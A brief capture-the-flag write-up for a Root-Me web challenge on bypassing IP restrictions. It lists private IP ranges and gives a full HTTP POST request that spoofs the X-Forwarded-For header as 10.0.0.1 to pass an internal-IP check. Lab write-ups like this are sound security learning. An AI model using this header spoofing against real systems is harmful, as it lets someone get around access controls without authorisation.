# HTTP - IP restriction bypass

Internal IP

`10.0.0.0 - 10.255.255.255 (10/8 prefix)`

`172.16.0.0 - 172.31.255.255 (172.16/12 prefix)`

`192.168.0.0 - 192.168.255.255 (192.168/16 prefix)`

X-Forwarded-For: client, proxy1, proxy2

\->

```
POST /web-serveur/ch68/ HTTP/1.1
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: http://challenge01.root-me.org
Connection: close
Referer: http://challenge01.root-me.org/web-serveur/ch68/
Cookie: _ga_SRYSKX09J7=GS1.1.1660615125.1.1.1660616763.0; _ga=GA1.1.841472709.1660615125
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 10.0.0.1

login=aa&mdp=aa
```



